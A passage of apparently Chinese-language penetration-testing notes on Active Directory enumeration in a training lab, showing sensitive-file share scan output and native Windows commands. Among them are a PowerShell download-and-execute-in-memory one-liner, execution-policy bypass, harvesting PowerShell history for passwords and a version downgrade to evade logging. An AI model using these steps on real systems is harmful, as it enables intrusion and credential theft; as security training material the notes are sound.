&#123;<span class="type">Black</span>&#125;&lt;<span class="type">KeepExtExactBlack</span>|<span class="type">R</span>|^\<span class="type">.ppk</span><span class="variable">$</span>|<span class="number">275</span><span class="type">B</span>|<span class="number">3</span>/<span class="number">31</span>/<span class="number">2022</span> <span class="number">12</span>:<span class="number">04</span>:<span class="number">40</span> <span class="type">PM</span>&gt;(\\<span class="type">ACADEMY</span>-<span class="type">EA</span>-<span class="type">DC01.INLANEFREIGHT.LOCAL</span>\<span class="type">Department</span> <span class="type">Shares</span>\<span class="type">IT</span>\<span class="type">Infosec</span>\<span class="type">StopTrace.ppk</span>) <span class="type">.ppk</span></span><br><span class="line"><span class="number">2022</span>-<span class="number">03</span>-<span class="number">31</span> <span class="number">12</span>:<span class="number">17</span>:<span class="number">19</span> -<span class="number">07</span>:<span class="number">00</span> [<span class="type">File</span>] &#123;<span class="type">Red</span>&#125;&lt;<span class="type">KeepExtExactRed</span>|<span class="type">R</span>|^\<span class="type">.key</span><span class="variable">$</span>|<span class="number">301</span><span class="type">B</span>|<span class="number">3</span>/<span class="number">31</span>/<span class="number">2022</span> <span class="number">12</span>:<span class="number">09</span>:<span class="number">17</span> <span class="type">PM</span>&gt;(\\<span class="type">ACADEMY</span>-<span class="type">EA</span>-<span class="type">DC01.INLANEFREIGHT.LOCAL</span>\<span class="type">Department</span> <span class="type">Shares</span>\<span class="type">IT</span>\<span class="type">Infosec</span>\<span class="type">WaitClear.key</span>) <span class="type">.key</span></span><br><span class="line"><span class="number">2022</span>-<span class="number">03</span>-<span class="number">31</span> <span class="number">12</span>:<span class="number">17</span>:<span class="number">19</span> -<span class="number">07</span>:<span class="number">00</span> [<span class="type">File</span>] &#123;<span class="type">Red</span>&#125;&lt;<span class="type">KeepExtExactRed</span>|<span class="type">R</span>|^\<span class="type">.sqldump</span><span class="variable">$</span>|<span class="number">312</span><span class="type">B</span>|<span class="number">3</span>/<span class="number">31</span>/<span class="number">2022</span> <span class="number">12</span>:<span class="number">05</span>:<span class="number">30</span> <span class="type">PM</span>&gt;(\\<span class="type">ACADEMY</span>-<span class="type">EA</span>-<span class="type">DC01.INLANEFREIGHT.LOCAL</span>\<span class="type">Department</span> <span class="type">Shares</span>\<span class="type">IT</span>\<span class="type">Development</span>\<span class="type">DenyRedo.sqldump</span>) <span class="type">.sqldump</span></span><br><span class="line"><span class="number">2022</span>-<span class="number">03</span>-<span class="number">31</span> <span class="number">12</span>:<span class="number">17</span>:<span class="number">19</span> -<span class="number">07</span>:<span class="number">00</span> [<span class="type">File</span>] &#123;<span class="type">Red</span>&#125;&lt;<span class="type">KeepExtExactRed</span>|<span class="type">R</span>|^\<span class="type">.sqldump</span><span class="variable">$</span>|<span class="number">310</span><span class="type">B</span>|<span class="number">3</span>/<span class="number">31</span>/<span class="number">2022</span> <span class="number">12</span>:<span class="number">05</span>:<span class="number">02</span> <span class="type">PM</span>&gt;(\\<span class="type">ACADEMY</span>-<span class="type">EA</span>-<span class="type">DC01.INLANEFREIGHT.LOCAL</span>\<span class="type">Department</span> <span class="type">Shares</span>\<span class="type">IT</span>\<span class="type">Development</span>\<span class="type">AddPublish.sqldump</span>) <span class="type">.sqldump</span></span><br><span class="line"><span class="number">2022</span>-<span class="number">03</span>-<span class="number">31</span> <span class="number">12</span>:<span class="number">17</span>:<span class="number">19</span> -<span class="number">07</span>:<span class="number">00</span> [<span class="type">Share</span>] &#123;<span class="type">Green</span>&#125;(\\<span class="type">ACADEMY</span>-<span class="type">EA</span>-<span class="type">FILE.INLANEFREIGHT.LOCAL</span>\<span class="type">WsusContent</span>)</span><br><span class="line"><span class="number">2022</span>-<span class="number">03</span>-<span class="number">31</span> <span class="number">12</span>:<span class="number">17</span>:<span class="number">19</span> -<span class="number">07</span>:<span class="number">00</span> [<span class="type">File</span>] &#123;<span class="type">Red</span>&#125;&lt;<span class="type">KeepExtExactRed</span>|<span class="type">R</span>|^\<span class="type">.keychain</span><span class="variable">$</span>|<span class="number">295</span><span class="type">B</span>|<span class="number">3</span>/<span class="number">31</span>/<span class="number">2022</span> <span class="number">12</span>:<span class="number">08</span>:<span class="number">42</span> <span class="type">PM</span>&gt;(\\<span class="type">ACADEMY</span>-<span class="type">EA</span>-<span class="type">DC01.INLANEFREIGHT.LOCAL</span>\<span class="type">Department</span> <span class="type">Shares</span>\<span class="type">IT</span>\<span class="type">Infosec</span>\<span class="type">SetStep.keychain</span>) <span class="type">.keychain</span></span><br><span class="line"><span class="number">2022</span>-<span class="number">03</span>-<span class="number">31</span> <span class="number">12</span>:<span class="number">17</span>:<span class="number">19</span> -<span class="number">07</span>:<span class="number">00</span> [<span class="type">File</span>] &#123;<span class="type">Black</span>&#125;&lt;<span class="type">KeepExtExactBlack</span>|<span class="type">R</span>|^\<span class="type">.tblk</span><span class="variable">$</span>|<span class="number">279</span><span class="type">B</span>|<span class="number">3</span>/<span class="number">31</span>/<span class="number">2022</span> <span class="number">12</span>:<span class="number">05</span>:<span class="number">25</span> <span class="type">PM</span>&gt;(\\<span class="type">ACADEMY</span>-<span class="type">EA</span>-<span class="type">DC01.INLANEFREIGHT.LOCAL</span>\<span class="type">Department</span> <span class="type">Shares</span>\<span class="type">IT</span>\<span class="type">Development</span>\<span class="type">FindConnect.tblk</span>) <span class="type">.tblk</span></span><br><span class="line"><span class="number">2022</span>-<span class="number">03</span>-<span class="number">31</span> <span class="number">12</span>:<span class="number">17</span>:<span class="number">19</span> -<span class="number">07</span>:<span class="number">00</span> [<span class="type">File</span>] &#123;<span class="type">Black</span>&#125;&lt;<span class="type">KeepExtExactBlack</span>|<span class="type">R</span>|^\<span class="type">.psafe3</span><span class="variable">$</span>|<span class="number">301</span><span class="type">B</span>|<span class="number">3</span>/<span class="number">31</span>/<span class="number">2022</span> <span class="number">12</span>:<span class="number">09</span>:<span class="number">33</span> <span class="type">PM</span>&gt;(\\<span class="type">ACADEMY</span>-<span class="type">EA</span>-<span class="type">DC01.INLANEFREIGHT.LOCAL</span>\<span class="type">Department</span> <span class="type">Shares</span>\<span class="type">IT</span>\<span class="type">Development</span>\<span class="type">GetUpdate.psafe3</span>) <span class="type">.psafe3</span></span><br><span class="line"><span class="number">2022</span>-<span class="number">03</span>-<span class="number">31</span> <span class="number">12</span>:<span class="number">17</span>:<span class="number">19</span> -<span class="number">07</span>:<span class="number">00</span> [<span class="type">File</span>] &#123;<span class="type">Red</span>&#125;&lt;<span class="type">KeepExtExactRed</span>|<span class="type">R</span>|^\<span class="type">.keypair</span><span class="variable">$</span>|<span class="number">278</span><span class="type">B</span>|<span class="number">3</span>/<span class="number">31</span>/<span class="number">2022</span> <span class="number">12</span>:<span class="number">09</span>:<span class="number">09</span> <span class="type">PM</span>&gt;(\\<span class="type">ACADEMY</span>-<span class="type">EA</span>-<span class="type">DC01.INLANEFREIGHT.LOCAL</span>\<span class="type">Department</span> <span class="type">Shares</span>\<span class="type">IT</span>\<span class="type">Infosec</span>\<span class="type">UnprotectConvertTo.keypair</span>) <span class="type">.keypair</span></span><br><span class="line"><span class="number">2022</span>-<span class="number">03</span>-<span class="number">31</span> <span class="number">12</span>:<span class="number">17</span>:<span class="number">19</span> -<span class="number">07</span>:<span class="number">00</span> [<span class="type">File</span>] &#123;<span class="type">Black</span>&#125;&lt;<span class="type">KeepExtExactBlack</span>|<span class="type">R</span>|^\<span class="type">.tblk</span><span class="variable">$</span>|<span class="number">280</span><span class="type">B</span>|<span class="number">3</span>/<span class="number">31</span>/<span class="number">2022</span> <span class="number">12</span>:<span class="number">05</span>:<span class="number">17</span> <span class="type">PM</span>&gt;(\\<span class="type">ACADEMY</span>-<span class="type">EA</span>-<span class="type">DC01.INLANEFREIGHT.LOCAL</span>\<span class="type">Department</span> <span class="type">Shares</span>\<span class="type">IT</span>\<span class="type">Development</span>\<span class="type">ExportJoin.tblk</span>) <span class="type">.tblk</span></span><br><span class="line"><span class="number">2022</span>-<span class="number">03</span>-<span class="number">31</span> <span class="number">12</span>:<span class="number">17</span>:<span class="number">19</span> -<span class="number">07</span>:<span class="number">00</span> [<span class="type">File</span>] &#123;<span class="type">Red</span>&#125;&lt;<span class="type">KeepExtExactRed</span>|<span class="type">R</span>|^\<span class="type">.mdf</span><span class="variable">$</span>|<span class="number">305</span><span class="type">B</span>|<span class="number">3</span>/<span class="number">31</span>/<span class="number">2022</span> <span class="number">12</span>:<span class="number">09</span>:<span class="number">27</span> <span class="type">PM</span>&gt;(\\<span class="type">ACADEMY</span>-<span class="type">EA</span>-<span class="type">DC01.INLANEFREIGHT.LOCAL</span>\<span class="type">Department</span> <span class="type">Shares</span>\<span class="type">IT</span>\<span class="type">Development</span>\<span class="type">FormatShow.mdf</span>) <span class="type">.mdf</span></span><br><span class="line"><span class="number">2022</span>-<span class="number">03</span>-<span class="number">31</span> <span class="number">12</span>:<span class="number">17</span>:<span class="number">19</span> -<span class="number">07</span>:<span class="number">00</span> [<span class="type">File</span>] &#123;<span class="type">Red</span>&#125;&lt;<span class="type">KeepExtExactRed</span>|<span class="type">R</span>|^\<span class="type">.mdf</span><span class="variable">$</span>|<span class="number">299</span><span class="type">B</span>|<span class="number">3</span>/<span class="number">31</span>/<span class="number">2022</span> <span class="number">12</span>:<span class="number">09</span>:<span class="number">14</span> <span class="type">PM</span>&gt;(\\<span class="type">ACADEMY</span>-<span class="type">EA</span>-<span class="type">DC01.INLANEFREIGHT.LOCAL</span>\<span class="type">Department</span> <span class="type">Shares</span>\<span class="type">IT</span>\<span class="type">Development</span>\<span class="type">LockConfirm.mdf</span>) <span class="type">.mdf</span></span><br><span class="line"></span><br><span class="line">&lt;<span class="type">SNIP</span>&gt;</span><br></pre></td></tr></table></figure>

<hr>
<h1 id="Living-Off-The-Land"><a href="#Living-Off-The-Land" class="headerlink" title="Living Off The Land"></a>Living Off The Land</h1><p>环境受限，使用 Windows&#x2F;Active Directory 原生的工具和命令。</p>
<h2 id="Basic-enum"><a href="#Basic-enum" class="headerlink" title="Basic enum"></a>Basic enum</h2><h3 id="Basic-Command"><a href="#Basic-Command" class="headerlink" title="Basic Command"></a>Basic Command</h3><table>
<thead>
<tr>
<th>Command</th>
<th>Result</th>
</tr>
</thead>
<tbody><tr>
<td><code>hostname</code></td>
<td>打印 PC 的名称</td>
</tr>
<tr>
<td><code>[System.Environment]::OSVersion.Version</code></td>
<td>打印出操作系统版本和修订级别</td>
</tr>
<tr>
<td><code>wmic qfe get Caption,Description,HotFixID,InstalledOn</code></td>
<td>打印应用于主机的补丁和热修复程序</td>
</tr>
<tr>
<td><code>ipconfig /all</code></td>
<td>打印出网络适配器状态和配置</td>
</tr>
<tr>
<td><code>set</code></td>
<td>显示当前会话的环境变量列表（从 CMD 提示符运行）</td>
</tr>
<tr>
<td><code>echo %USERDOMAIN%</code></td>
<td>显示主机所属的域名（从 CMD 提示符运行）</td>
</tr>
<tr>
<td><code>echo %logonserver%</code></td>
<td>打印出主机签入的域控制器的名称（从 CMD 提示符运行）</td>
</tr>
<tr>
<td><code>systeminfo</code></td>
<td>显示有关计算机及其操作系统的详细配置信息，包括操作系统配置、安全信息、产品 ID 和硬件属性（如 RAM、磁盘空间和网卡）。</td>
</tr>
</tbody></table>
<h3 id="PowerShell-1"><a href="#PowerShell-1" class="headerlink" title="PowerShell"></a>PowerShell</h3><p>PowerShell 自 2006 年问世以来，为 Windows 系统管理员提供了一个广泛的框架，用于管理 Windows 系统和 AD 环境的各个方面。它是一种功能强大的脚本语言，可用于深入研究系统。PowerShell 有许多内置函数和模块，可以在交战中使用这些函数和模块来侦察主机和网络以及发送和接收文件。</p>
<table>
<thead>
<tr>
<th>Cmd-Let</th>
<th>describe</th>
</tr>
</thead>
<tbody><tr>
<td><code>Get-Module</code></td>
<td>列出可供使用的已加载模块。</td>
</tr>
<tr>
<td><code>Get-ExecutionPolicy -List</code></td>
<td>将打印主机上每个范围的<a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_execution_policies?view=powershell-7.2">执行策略设置。</a></td>
</tr>
<tr>
<td><code>Set-ExecutionPolicy Bypass -Scope Process</code></td>
<td>这将使用该参数更改当前进程的策略<code>-Scope</code>。一旦退出或终止该进程，此操作将恢复该策略。这是理想的，因为不会对受害主机进行永久性更改。</td>
</tr>
<tr>
<td><code>Get-Content C:\Users\&lt;USERNAME&gt;\AppData\Roaming\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt</code></td>
<td>通过此字符串，可以获取指定用户的 PowerShell 历史记录。这非常有用，因为命令历史记录可能包含密码或指向包含密码的配置文件或脚本。</td>
</tr>
<tr>
<td>&#96;Get-ChildItem Env:</td>
<td>ft Key,Value&#96;</td>
</tr>
<tr>
<td><code>powershell -nop -c &quot;iex(New-Object Net.WebClient).DownloadString(&#39;URL to download the file from&#39;); &lt;follow-on commands&gt;&quot;</code></td>
<td>这是一种使用 PowerShell 从 Web 下载文件并从内存中调用它的快速简便的方法。</td>
</tr>
</tbody></table>
<h4 id="Powershell-downgrade"><a href="#Powershell-downgrade" class="headerlink" title="Powershell downgrade"></a>Powershell downgrade</h4><p>主机上通常存在多个版本的 PowerShell。如果不卸载，它们仍然可以使用。Powershell 事件日志记录是 Powershell 3.0 及更高版本引入的功能。考虑到这一点，可以尝试调用 Powershell 2.0 或更早版本。如果成功，在 shell 中的操作将不会记录在事件查看器中。</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">Get-host</span></span><br><span class="line"></span><br><span class="line">Name             : ConsoleHost</span><br><span class="line">Version          : <span class="number">5.1</span>.<span class="number">19041.1320</span></span><br><span class="line">InstanceId       : <span class="number">18</span>ee9fb4<span class="literal">-ac42-4dfe-85b2-61687291bbfc</span></span><br><span class="line">UI               : System.Management.Automation.Internal.Host.InternalHostUserInterface</span><br><span class="line">CurrentCulture   : en<span class="literal">-US</span></span><br><span class="line">CurrentUICulture : en<span class="literal">-US</span></span><br><span class="line">PrivateData      : Microsoft.PowerShell.ConsoleHost+ConsoleColorProxy</span><br><span class="line">DebuggerEnabled  : True</span><br><span class="line">IsRunspacePushed : False</span><br><span class="line">Runspace         : System.Management.Automation.Runspaces.LocalRunspace</span><br><span class="line"></span><br><span class="line"><span class="built_in">PS</span> C:\&gt; powershell.exe <span class="literal">-version</span> <span class="number">2</span></span><br><span class="line">Windows PowerShell</span><br><span class="line">Copyright (C) <span class="number">2009</span> Microsoft Corporation. All rights reserved.</span><br><span class="line"></span><br><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">Get-host</span></span><br><span class="line">Name             : ConsoleHost</span><br><span class="line">Version          : <span class="number">2.0</span></span><br><span class="line">InstanceId       : <span class="number">121</span>b807c<span class="literal">-6daa-4691-85ef-998ac137e469</span></span><br><span class="line">UI               : System.Management.Automation.Internal.Host.InternalHostUserInterface</span><br><span class="line">CurrentCulture   : en<span class="literal">-US</span></span><br><span class="line">CurrentUICulture : en<span class="literal">-US</span></span><br><span class="line">PrivateData      : Microsoft.PowerShell.ConsoleHost+ConsoleColorProxy</span><br><span class="line">IsRunspacePushed : False</span><br><span class="line">Runspace         : System.Management.Automation.Runspaces.LocalRunspace</span><br><span class="line"></span><br><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">get-module</span></span><br><span class="line"></span><br><span class="line">ModuleType Version    Name                                ExportedCommands</span><br><span class="line"><span class="literal">----------</span> <span class="literal">-------</span>    <span class="literal">----</span>                                <span class="literal">----------------</span></span><br><span class="line">Script     <span class="number">0.0</span>        chocolateyProfile                   &#123;TabExpansion, <span class="built_in">Update-SessionEnvironment</span>, refreshenv&#125;</span><br><span class="line">Manifest   <span class="number">3.1</span>.<span class="number">0.0</span>    Microsoft.PowerShell.Management     &#123;<span class="built_in">Add-Computer</span>, <span class="built_in">Add-Content</span>, <span class="built_in">Checkpoint-Computer</span>, <span class="built_in">Clear-Content</span>...&#125;</span><br><span class="line">Manifest   <span class="number">3.1</span>.<span class="number">0.0</span>    Microsoft.PowerShell.Utility        &#123;<span class="built_in">Add-Member</span>, <span class="built_in">Add-Type</span>, <span class="built_in">Clear-Variable</span>, <span class="built_in">Compare-Object</span>...&#125;</span><br><span class="line">Script     <span class="number">0.7</span>.<span class="number">3.1</span>    posh<span class="literal">-git</span>                            &#123;<span class="built_in">Add-PoshGitToProfile</span>, <span class="built_in">Add-SshKey</span>, <span class="built_in">Enable-GitColors</span>, <span class="built_in">Expand-GitCommand</span>...&#125;</span><br><span class="line">Script     <span class="number">2.0</span>.<span class="number">0</span>      PSReadline                          &#123;<span class="built_in">Get-PSReadLineKeyHandler</span>, <span class="built_in">Get-PSReadLineOption</span>, <span class="built_in">Remove-PSReadLineKeyHandler</span>...</span><br></pre></td></tr></table></figure>

<h3 id="Firewall"><a href="#Firewall" class="headerlink" title="Firewall"></a>Firewall</h3><p><a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows-server/networking/technologies/netsh/netsh-contexts">netsh</a>和<a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/sc-query">sc</a>实用程序来帮助了解 Windows 防火墙设置方面的主机状态并检查 Windows Defender 的状态。</p>
<h4 id="netsh"><a href="#netsh" class="headerlink" title="netsh"></a>netsh</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; netsh advfirewall show allprofiles</span><br><span class="line"></span><br><span class="line">Domain Profile Settings:</span><br><span class="line"><span class="literal">----------------------------------------------------------------------</span></span><br><span class="line">State                                 OFF</span><br><span class="line">Firewall Policy                       BlockInbound,AllowOutbound</span><br><span class="line">LocalFirewallRules                    N/A (GPO<span class="literal">-store</span> only)</span><br><span class="line">LocalConSecRules                      N/A (GPO<span class="literal">-store</span> only)</span><br><span class="line">InboundUserNotification               Disable</span><br><span class="line">RemoteManagement                      Disable</span><br><span class="line">UnicastResponseToMulticast            Enable</span><br><span class="line"></span><br><span class="line">Logging:</span><br><span class="line">LogAllowedConnections                 Disable</span><br><span class="line">LogDroppedConnections                 Disable</span><br><span class="line">FileName                              %systemroot%\system32\LogFiles\Firewall\pfirewall.log</span><br><span class="line">MaxFileSize                           <span class="number">4096</span></span><br><span class="line"></span><br><span class="line">Private Profile Settings:</span><br><span class="line"><span class="literal">----------------------------------------------------------------------</span></span><br><span class="line">State                                 OFF</span><br><span class="line">Firewall Policy                       BlockInbound,AllowOutbound</span><br><span class="line">LocalFirewallRules                    N/A (GPO<span class="literal">-store</span> only)</span><br><span class="line">LocalConSecRules                      N/A (GPO<span class="literal">-store</span> only)</span><br><span class="line">InboundUserNotification               Disable</span><br><span class="line">RemoteManagement                      Disable</span><br><span class="line">UnicastResponseToMulticast            Enable</span><br><span class="line"></span><br><span class="line">Logging:</span><br><span class="line">LogAllowedConnections                 Disable</span><br><span class="line">LogDroppedConnections                 Disable</span><br><span class="line">FileName                              %systemroot%\system32\LogFiles\Firewall\pfirewall.log</span><br><span class="line">MaxFileSize                           <span class="number">4096</span></span><br><span class="line"></span><br><span class="line">Public Profile Settings:</span><br><span class="line"><span class="literal">----------------------------------------------------------------------</span></span><br><span class="line">State                                 OFF</span><br><span class="line">Firewall Policy                       BlockInbound,AllowOutbound</span><br><span class="line">LocalFirewallRules                    N/A (GPO<span class="literal">-store</span> only)</span><br><span class="line">LocalConSecRules                      N/A (GPO<span class="literal">-store</span> only)</span><br><span class="line">InboundUserNotification               Disable</span><br><span class="line">RemoteManagement                      Disable</span><br><span class="line">UnicastResponseToMulticast            Enable</span><br><span class="line"></span><br><span class="line">Logging:</span><br><span class="line">LogAllowedConnections                 Disable</span><br><span class="line">LogDroppedConnections                 Disable</span><br><span class="line">FileName                              %systemroot%\system32\LogFiles\Firewall\pfirewall.log</span><br><span class="line">MaxFileSize                           <span class="number">4096</span></span><br></pre></td></tr></table></figure>

<h4 id="sc"><a href="#sc" class="headerlink" title="sc"></a>sc</h4><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\&gt; <span class="title">sc</span> <span class="title">query</span> <span class="title">windefend</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">SERVICE_NAME</span>: <span class="title">windefend</span></span></span><br><span class="line"><span class="function">        <span class="title">TYPE</span>               : 10  <span class="title">WIN32_OWN_PROCESS</span></span></span><br><span class="line"><span class="function">        <span class="title">STATE</span>              : 4  <span class="title">RUNNING</span></span></span><br><span class="line"><span class="function">                                (<span class="title">STOPPABLE</span>, <span class="title">NOT_PAUSABLE</span>, <span class="title">ACCEPTS_SHUTDOWN</span>)</span></span><br><span class="line"><span class="function">        <span class="title">WIN32_EXIT_CODE</span>    : 0  (0<span class="title">x0</span>)</span></span><br><span class="line"><span class="function">        <span class="title">SERVICE_EXIT_CODE</span>  : 0  (0<span class="title">x0</span>)</span></span><br><span class="line"><span class="function">        <span class="title">CHECKPOINT</span>         : 0<span class="title">x0</span></span></span><br><span class="line"><span class="function">        <span class="title">WAIT_HINT</span>          : 0<span class="title">x0</span></span></span><br></pre></td></tr></table></figure>

<h4 id="Get-MpComputerStatus"><a href="#Get-MpComputerStatus" class="headerlink" title="Get-MpComputerStatus"></a>Get-MpComputerStatus</h4><p>下面使用 PowerShell 中的 Get-MpComputerStatuscmdlet 检查状态和配置设置。</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">Get-MpComputerStatus</span></span><br><span class="line"></span><br><span class="line">AMEngineVersion                  : <span class="number">1.1</span>.<span class="number">19000.8</span></span><br><span class="line">AMProductVersion                 : <span class="number">4.18</span>.<span class="number">2202.4</span></span><br><span class="line">AMRunningMode                    : Normal</span><br><span class="line">AMServiceEnabled                 : True</span><br><span class="line">AMServiceVersion                 : <span class="number">4.18</span>.<span class="number">2202.4</span></span><br><span class="line">AntispywareEnabled               : True</span><br><span class="line">AntispywareSignatureAge          : <span class="number">0</span></span><br><span class="line">AntispywareSignatureLastUpdated  : <span class="number">3</span>/<span class="number">21</span>/<span class="number">2022</span> <span class="number">4</span>:<span class="number">06</span>:<span class="number">15</span> AM</span><br><span class="line">AntispywareSignatureVersion      : <span class="number">1.361</span>.<span class="number">414.0</span></span><br><span class="line">AntivirusEnabled                 : True</span><br><span class="line">AntivirusSignatureAge            : <span class="number">0</span></span><br><span class="line">AntivirusSignatureLastUpdated    : <span class="number">3</span>/<span class="number">21</span>/<span class="number">2022</span> <span class="number">4</span>:<span class="number">06</span>:<span class="number">16</span> AM</span><br><span class="line">AntivirusSignatureVersion        : <span class="number">1.361</span>.<span class="number">414.0</span></span><br><span class="line">BehaviorMonitorEnabled           : True</span><br><span class="line">ComputerID                       : FDA97E38<span class="literal">-1666-4534-98D4-943A9A871482</span></span><br><span class="line">ComputerState                    : <span class="number">0</span></span><br><span class="line">DefenderSignaturesOutOfDate      : False</span><br><span class="line">DeviceControlDefaultEnforcement  : Unknown</span><br><span class="line">DeviceControlPoliciesLastUpdated : <span class="number">3</span>/<span class="number">20</span>/<span class="number">2022</span> <span class="number">9</span>:<span class="number">08</span>:<span class="number">34</span> PM</span><br><span class="line">DeviceControlState               : Disabled</span><br><span class="line">FullScanAge                      : <span class="number">4294967295</span></span><br><span class="line">FullScanEndTime                  :</span><br><span class="line">FullScanOverdue                  : False</span><br><span class="line">FullScanRequired                 : False</span><br><span class="line">FullScanSignatureVersion         :</span><br><span class="line">FullScanStartTime                :</span><br><span class="line">IoavProtectionEnabled            : True</span><br><span class="line">IsTamperProtected                : True</span><br><span class="line">IsVirtualMachine                 : False</span><br><span class="line">LastFullScanSource               : <span class="number">0</span></span><br><span class="line">LastQuickScanSource              : <span class="number">2</span></span><br><span class="line"></span><br><span class="line">&lt;SNIP&gt;</span><br></pre></td></tr></table></figure>

<p>了解主机的 AV 设置的修订版本以及启用&#x2F;禁用的设置，可以知道扫描运行的频率、按需威胁警报是否处于活动状态等等。这也是报告的重要信息。防御者通常可能认为某些设置已启用或扫描计划以特定间隔运行。</p>
<h4 id="qwinsta"><a href="#qwinsta" class="headerlink" title="qwinsta"></a>qwinsta</h4><p>用于显示远程桌面会话（RDP 会话）或终端服务会话的状态。</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; qwinsta</span><br><span class="line"></span><br><span class="line"> SESSIONNAME       USERNAME                 ID  STATE   <span class="built_in">TYPE</span>        DEVICE</span><br><span class="line"> services                                    <span class="number">0</span>  Disc</span><br><span class="line">&gt;console           forend                    <span class="number">1</span>  Active</span><br><span class="line"> rdp<span class="literal">-tcp</span>                                 <span class="number">65536</span>  Listen</span><br></pre></td></tr></table></figure>

<h3 id="Network-Information"><a href="#Network-Information" class="headerlink" title="Network Information"></a>Network Information</h3><table>
<thead>
<tr>
<th>Command</th>
<th>Describe</th>
</tr>
</thead>
<tbody><tr>
<td><code>arp -a</code></td>
<td>列出存储在 arp 表中的所有已知主机。</td>
</tr>
<tr>
<td><code>ipconfig /all</code></td>
<td>打印出主机的适配器设置。可以从这里找出网段。</td>
</tr>
<tr>
<td><code>route print</code></td>
<td>显示识别已知网络和与主机共享的第三层路由的路由表（IPv4 和 IPv6）。</td>
</tr>
<tr>
<td><code>netsh advfirewall show state</code></td>
<td>显示主机防火墙的状态。可以确定它是否处于活动状态并过滤流量。</td>
</tr>
</tbody></table>
<h3 id="WMI"><a href="#WMI" class="headerlink" title="WMI"></a>WMI</h3><p><a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows/win32/wmisdk/about-wmi">Windows 管理规范 (WMI)</a>是一种脚本引擎，广泛用于 Windows 企业环境中，用于检索信息并在本地和远程主机上运行管理任务。</p>
<table>
<thead>
<tr>
<th>命令</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td><code>wmic qfe get Caption,Description,HotFixID,InstalledOn</code></td>
<td>打印补丁级别和应用的修补程序的描述</td>
</tr>
<tr>
<td><code>wmic computersystem get Name,Domain,Manufacturer,Model,Username,Roles /format:List</code></td>
<td>显示基本主机信息以包含列表中的任何属性</td>
</tr>
<tr>
<td><code>wmic process list /format:list</code></td>
<td>主机上所有进程的列表</td>
</tr>
<tr>
<td><code>wmic ntdomain list /format:list</code></td>
<td>显示有关域和域控制器的信息</td>
</tr>
<tr>
<td><code>wmic useraccount list /format:list</code></td>
<td>显示有关所有本地帐户以及已登录到设备的任何域帐户的信息</td>
</tr>
<tr>
<td><code>wmic group list /format:list</code></td>
<td>有关所有本地团体的信息</td>
</tr>
<tr>
